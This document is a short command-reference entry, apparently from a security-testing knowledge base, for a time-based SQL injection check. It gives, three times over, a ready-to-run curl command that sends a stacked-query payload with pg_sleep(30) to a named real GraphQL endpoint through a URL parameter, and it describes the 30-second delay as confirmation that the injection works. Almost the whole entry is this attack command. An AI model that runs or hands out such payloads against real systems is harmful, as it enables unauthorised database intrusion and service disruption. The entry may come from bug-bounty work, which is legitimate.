---
data: >-
  time curl -X POST
  https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
tags:
  - timing-attack
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.927Z'
id: 8c8b90f5-1034-4889-baf4-ce779e6fa987
verified: false
validated: true
submitted: true
---
# time-curl-30s-sleep

## Command

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Description

Confirms injection with extended 30-second timing test.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Timer | Yes |
| Payload | 30s sleep | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Expected Output

~30+ seconds delay.

## Related

- [[commands/time-curl-10s-sleep]]
- [[procedures/Verify-Injection-Using-Timing-Attacks-with-pg_sleep]]
